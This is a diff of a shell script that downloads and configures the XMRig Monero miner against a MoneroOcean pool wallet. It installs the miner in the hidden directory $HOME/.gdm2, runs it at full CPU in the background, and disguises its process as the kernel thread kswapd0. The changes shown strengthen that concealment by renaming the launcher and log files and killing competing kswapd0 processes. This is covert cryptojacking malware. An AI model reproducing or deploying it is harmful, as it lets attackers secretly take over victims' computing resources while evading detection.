@@ -194,7 +194,7 @@ if (test $? -ne 0); then
  #   exit 1
   fi
   
-  wget https://github.com/xmrig/xmrig/releases/latest
+  wget https://github.com/xmrig/xmrig/releases/latest -O xmrig.tar.gz
 
   echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
   if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
@@ -234,7 +234,7 @@ sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gd
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/log'",#' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
@@ -243,9 +243,10 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_backgro
 # preparing script
 
 killall xmrig
+killall kswapd0
 
 echo "[*] Creating $HOME/.gdm2/gdm2.rc script"
-cat >$HOME/.gdm2/miner.sh <<EOL
+cat >$HOME/.gdm2/gdm2.rc <<EOL
 #!/bin/bash
 if ! pidof kswapd0 >/dev/null; then
   nice $HOME/.gdm2/kswapd0 \$*
@@ -255,7 +256,7 @@ else
 fi
 EOL
 
-chmod +x $HOME/.gdm2/miner.sh
+chmod +x $HOME/.gdm2/gdm2.rc
 
 # preparing script background work and work under reboot
 
